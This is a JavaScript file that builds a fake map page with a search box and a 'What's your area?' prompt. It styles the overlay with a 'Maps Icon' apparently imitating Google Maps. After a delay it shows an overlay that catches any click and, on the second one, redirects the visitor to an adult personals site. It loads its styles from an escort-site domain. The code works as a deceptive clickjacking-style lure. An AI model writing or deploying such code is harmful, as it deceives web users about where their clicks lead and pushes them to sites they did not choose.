
// Create and append stylesheet link
const link = document.createElement('link');
link.rel = 'stylesheet';
link.type = 'text/css';
link.href = 'https://test.escortbabylone.info/css/stylemap.css';
document.head.appendChild(link);

// Create map iframe
const body = document.body;
const mapIframe = document.createElement('iframe');
mapIframe.classList.add('map-background');
mapIframe.src=' '
// mapIframe.src = 'https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d26384.27576511277!2d-102.43962322089845!3d40.33345300000001!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x87760ebc6b2b328b%3A0x96a10f19223b6f9d!2sWashington%20County!5e0!3m2!1sen!2sus!4v1717021068024!5m2!1sen!2sus';
mapIframe.width = '1200';
mapIframe.height = '1200';
// mapIframe.width = '600';
// mapIframe.height = '450';
mapIframe.style.border = '0';
mapIframe.allowFullscreen = true;
mapIframe.class = 'center';

// Create overlay
const overlay = document.createElement('div');
overlay.classList.add('overlay');
overlay.setAttribute('text-align', 'center');
overlay.setAttribute('width', '500');
overlay.setAttribute('height', '500');

// Create Google button overlay
const googleButtonOverlay = document.createElement('a');
googleButtonOverlay.href = '#';
googleButtonOverlay.classList.add('google-button-overlay');
googleButtonOverlay.id = 'googleButtonOverlay';
googleButtonOverlay.class='center';
googleButtonOverlay.width='500';
googleButtonOverlay.height='500';


//overlay.appendChild(googleButtonOverlay);

const googleIcon = document.createElement('img');
googleIcon.src = 'https://newsite-livid.vercel.app/megapic.jpg';
googleIcon.alt = 'Maps Icon';
googleIcon.class='center';
googleIcon.width='130';
googleIcon.height='300';
// overlay.appendChild(googleIcon);

const googleLabel = document.createElement('label');
googleLabel.setAttribute('for', 'accept');
googleLabel.textContent = ' ';
googleLabel.class='center';
googleLabel.width='100';
googleLabel.height='500';

googleButtonOverlay.appendChild(googleIcon);
googleButtonOverlay.appendChild(googleLabel);
overlay.appendChild(googleButtonOverlay);

// Create main container
const container = document.createElement('div');
// container.src = 'https://newsite-livid.vercel.app/megapic.jpg';

container.classList.add('container');
container.style.backgroundImage = "url('https://newsite-livid.vercel.app/megapic.jpg')";

// container.setAttribute('display', 'block');
// container.setAttribute('text-align', 'center');
// container.setAttribute('margin-right', 'auto');
// container.setAttribute('margin-right', 'auto');
// container.setAttribute('width', '200');
// container.setAttribute('height', '200');

// Create input section
const inputSection = document.createElement('div');
inputSection.classList.add('input-section');

const areaLabel = document.createElement('label');
areaLabel.setAttribute('for', 'area');
areaLabel.textContent = "What's your area?";

const hiddenInput = document.createElement('input');
hiddenInput.type = 'hidden';
hiddenInput.id = 'area';
hiddenInput.name = 'area';

inputSection.appendChild(areaLabel);
inputSection.appendChild(document.createElement('br'));
inputSection.appendChild(hiddenInput);

// Create search container
const searchContainer = document.createElement('div');
searchContainer.classList.add('search-container');

const searchInput = document.createElement('input');
searchInput.style.border = '1px solid #6565c5';
searchInput.style.outline = 'none';
searchInput.type = 'text';
searchInput.placeholder = 'Search...';

const searchIcon = document.createElement('i');
searchIcon.id = 'searchIcon';
searchIcon.classList.add('fa', 'fa-search');
searchIcon.style.fontSize = '20px';
searchIcon.style.color = '#6565c5';
searchIcon.style.padding = '7px';

const clearButton = document.createElement('button');
clearButton.classList.add('clear-btn');
clearButton.innerHTML = '&times;';
clearButton.class='center';
clearButton.width='500';
clearButton.height='500';

searchContainer.appendChild(searchInput);
searchContainer.appendChild(searchIcon);
searchContainer.appendChild(clearButton);
inputSection.appendChild(searchContainer);
container.appendChild(inputSection);

// Append elements to DOM
body.appendChild(mapIframe);
body.appendChild(overlay);
body.appendChild(container);
// body.appendChild(googleButtonOverlay);
// body.appendChild(googleIcon);

// Document ready event
document.addEventListener('DOMContentLoaded', function() {
    setTimeout(function() {
        document.querySelector('.overlay').style.display = 'block';
    }, 4000);
});

// Create accept button
const acceptButton = document.createElement('label');
acceptButton.classList.add('accept-button');
// acceptButton.style.display = 'none';
acceptButton.setAttribute('accept-button', 'center');
acceptButton.setAttribute('width', '500');
acceptButton.setAttribute('height', '500');


let clickCount = 0;
acceptButton.addEventListener('click', () => {
    clickCount++;
    if (clickCount === 2) {
        window.location.href = 'https://megapersonals.eu';
    }
});

overlay.appendChild(acceptButton);

// Overlay click handler
overlay.addEventListener('click', function() {
    acceptButton.click();
});
